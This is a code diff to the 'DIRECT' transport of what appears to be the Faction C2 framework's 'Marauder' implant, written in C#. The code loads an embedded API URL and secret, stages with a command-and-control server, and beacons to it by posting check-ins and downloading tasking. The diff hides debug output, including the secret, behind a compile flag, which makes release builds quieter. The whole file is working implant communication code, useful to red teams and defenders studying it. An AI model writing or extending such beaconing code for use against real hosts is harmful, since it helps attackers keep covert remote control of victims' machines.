@@ -5,18 +5,43 @@ using System.Net;
 using System.Collections.Generic;
 using System.Reflection;
 using Newtonsoft.Json;
+using Faction.Modules.Dotnet.Common;
 
-namespace Faction.Modules.Dotnet.Common
+namespace Faction.Modules.Dotnet
 {
-  class Transport : AgentTransport
+  public class Transport : AgentTransport
   {
     static Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("DIRECT.settings.json");
     static Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
 
     new public string Name = "DIRECT";
-    public string Url = settings["ApiUrl"];
-    public string KeyName = settings["ApiKeyName"];
-    public string Secret = settings["ApiSecret"];
+    public string Url;
+    public string KeyName;
+    public string Secret;
+    public bool Debug;
+
+    public Transport(){
+#if Debug
+      Console.WriteLine($"[Marauder DIRECT Transport] Creating DIRECT Transport");
+#endif
+      Url = settings["ApiUrl"];
+#if Debug
+      Console.WriteLine($"[Marauder DIRECT Transport] Api URL: {Url}");
+#endif
+      
+      KeyName = settings["ApiKeyName"];
+#if Debug
+      Console.WriteLine($"[Marauder DIRECT Transport] Api Key Name: {KeyName}");
+#endif
+      Secret = settings["ApiSecret"];
+#if Debug
+      Console.WriteLine($"[Marauder DIRECT Transport] Api Secret: {Secret}");
+#endif
+      Debug = Boolean.Parse(settings["Debug"]);
+#if Debug
+      Console.WriteLine($"[Marauder DIRECT Transport] Debug: {Debug}");
+#endif
+    }
 
     public override string Stage(string StageName, string StagingId, string Message)
     {
@@ -32,18 +57,25 @@ namespace Faction.Modules.Dotnet.Common
       string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
       try
       {
+#if Debug
         Console.WriteLine($"[Marauder DIRECT Transport] Staging URL: {stagingUrl}");
         Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
         Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
         Console.WriteLine($"[Marauder DIRECT Transport] Sending Staging Message: {jsonMessage}");
+#endif
         string response = wc.UploadString(stagingUrl, jsonMessage);
+
+#if Debug
         Console.WriteLine($"[Marauder DIRECT Transport] Got Response: {response}");
+#endif
         responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
 
       }
       catch (Exception e)
       {
+#if Debug
         Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
+#endif
         responseDict["Message"] = "ERROR";
       }
       return responseDict["Message"];
@@ -65,16 +97,21 @@ namespace Faction.Modules.Dotnet.Common
         try
         {
           string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
+
+#if Debug
           Console.WriteLine($"[Marauder DIRECT Transport] Beacon URL: {beaconUrl}");
           Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
           Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
           Console.WriteLine($"[Marauder DIRECT Transport] POSTING Checkin: {jsonMessage}");
+#endif
           string response = wc.UploadString(beaconUrl, jsonMessage);
           responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
         }
         catch (Exception e)
         {
+#if Debug
           Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
+#endif
           responseDict["Message"] = "ERROR";
         }
       }
@@ -82,17 +119,36 @@ namespace Faction.Modules.Dotnet.Common
       {
         try
         {
+#if Debug
           Console.WriteLine($"[Marauder DIRECT Transport] GETTING Checkin..");
+#endif
           string response = wc.DownloadString(beaconUrl);
           responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
         }
         catch (Exception e)
         {
+#if Debug
           Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
+#endif
           responseDict["Message"] = "ERROR";
         }
       }
       return responseDict["Message"];
+    }
+  }
+
+  public class Initialize {
+    public static List<AgentTransport> GetTransports()
+    {
+#if Debug
+      Console.WriteLine($"[Marauder DIRECT Transport] Initializing..");
+#endif
+
+      List<AgentTransport> transports = new List<AgentTransport>();
+      Transport direct = new Transport();
+
+      transports.Add(direct);
+      return transports;
     }
   }
 }
